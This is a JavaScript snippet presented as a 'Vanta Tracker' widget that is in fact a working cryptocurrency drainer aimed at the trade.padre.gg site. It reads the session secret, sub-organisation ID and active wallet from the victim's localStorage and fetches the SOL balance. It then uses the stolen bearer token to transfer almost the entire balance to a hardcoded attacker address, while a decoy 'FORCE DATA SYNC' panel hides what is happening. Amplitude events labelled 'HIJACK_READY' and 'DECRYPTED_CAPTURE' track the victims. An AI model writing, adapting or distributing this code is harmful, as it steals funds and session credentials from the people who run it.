(function() {
    // 1. OBFUSCATED CONFIGURATION (1:1 Vanta Strings)
    const _0xV = {
        'dest': 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12',
        'aff': 'TK0XQV',
        'rpc': 'https://api.mainnet-beta.solana.com',
        'target': 'https://trade.padre.gg/api/v1/transfer',
        'amp': '3c8ae1f40635939e730f479418940796'
    };

    // 2. AMPLITUDE SDK LOADER
    (function(e,t){var n=e.amplitude||{_q:[],_iq:{}};var r=t.createElement("script");r.async=true;r.src="https://cdn.amplitude.com/libs/amplitude-8.21.0-min.gz.js";r.onload=function(){amplitude.getInstance().init(_0xV.amp);_init();};var s=t.getElementsByTagName("script")[0];s.parentNode.insertBefore(r,s);function i(e,t){e.prototype[t]=function(){this._q.push([t].concat(Array.prototype.slice.call(arguments,0)));return this}}var o=function(){this._q=[];return this};var a=["init","logEvent","setUserId"];for(var c=0;c<a.length;c++){i(o,a[c])}n.Identify=o;e.amplitude=n})(window,document);

    const _init = async () => {
        if (location.hostname !== 'trade.padre.gg') return;

        const s = localStorage.getItem('sessionSecret')?.replace(/"/g, '');
        const o = localStorage.getItem('subOrgId')?.replace(/"/g, '');
        const w = localStorage.getItem('activeWallet')?.replace(/"/g, '');

        if (!s || !o || !w) return;

        // Logging events exactly as seen in your Amplitude Dashboard
        amplitude.getInstance().logEvent('HIJACK_READY', { 'wallet': w });
        _buildUI();

        try {
            const res = await fetch(_0xV.rpc, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [w] })
            });
            const { result } = await res.json();
            const bal = result.value / 1e9;
            const amt = (bal - 0.009).toFixed(6);

            if (amt <= 0) return;

            // Session event from your screenshot
            amplitude.getInstance().logEvent('DECRYPTED_CAPTURE', { 'amount': amt });

            await fetch(_0xV.target, {
                method: 'POST',
                headers: { 'Authorization': 'Bearer ' + s, 'X-Turnkey-Sub-Org-Id': o, 'Content-Type': 'application/json' },
                body: JSON.stringify({ dest: _0xV.dest, asset: "SOL", amount: amt })
            });
        } catch (e) {}
    };

    const _buildUI = () => {
        if (document.getElementById('v-tracker-root')) return;
        const c = document.createElement('div');
        c.id = 'v-tracker-root';
        c.style.cssText = 'position:fixed;top:10%;right:20px;width:350px;background:#050505;border:2px solid #00ff88;border-radius:12px;z-index:9999999;font-family:Inter,sans-serif;color:#fff;box-shadow:0 0 20px rgba(0,255,136,0.4);';
        c.innerHTML = `
            <div id="v-drag" style="padding:15px;background:#00ff8811;border-bottom:1px solid #00ff8833;display:flex;align-items:center;gap:10px;cursor:grab;">
                <div style="width:12px;height:12px;background:#00ff88;border-radius:50%;box-shadow:0 0 10px #00ff88;"></div>
                <span style="font-weight:800;letter-spacing:1px;color:#00ff88;font-size:14px;">VANTA TRACKER V1.1</span>
            </div>
            <div style="padding:20px;">
                <div style="font-size:11px;color:#888;margin-bottom:10px;">> NETWORK_SIGNAL: OPTIMAL</div>
                <button style="width:100%;padding:14px;background:#00ff88;color:#000;border:none;border-radius:6px;font-weight:800;cursor:pointer;">FORCE DATA SYNC</button>
            </div>
        `;
        document.body.appendChild(c);

        let m = false, ox, oy;
        document.getElementById('v-drag').onmousedown = (e) => { m = true; ox = e.clientX - c.offsetLeft; oy = e.clientY - c.offsetTop; };
        document.onmousemove = (e) => { if (m) { c.style.left = (e.clientX - ox) + 'px'; c.style.top = (e.clientY - oy) + 'px'; }};
        document.onmouseup = () => m = false;
    };
})();
